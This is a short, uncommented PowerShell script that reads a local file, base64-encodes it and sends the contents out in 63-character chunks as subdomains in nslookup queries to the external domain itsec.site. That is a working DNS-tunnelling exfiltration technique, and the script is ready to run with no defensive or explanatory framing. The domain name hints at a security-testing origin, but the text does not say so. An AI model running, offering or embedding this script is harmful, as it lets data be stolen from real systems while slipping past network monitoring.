$filepath = "DataFile.txt"
$data = Get-Content -Path $filepath -Raw
$encode=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data)) -split '(.{63})' | Where-Object {$_ -ne ''}
foreach ($chunk in $encode){
$query="$chunk.itsec.site"
nslookup $query itsec.site
}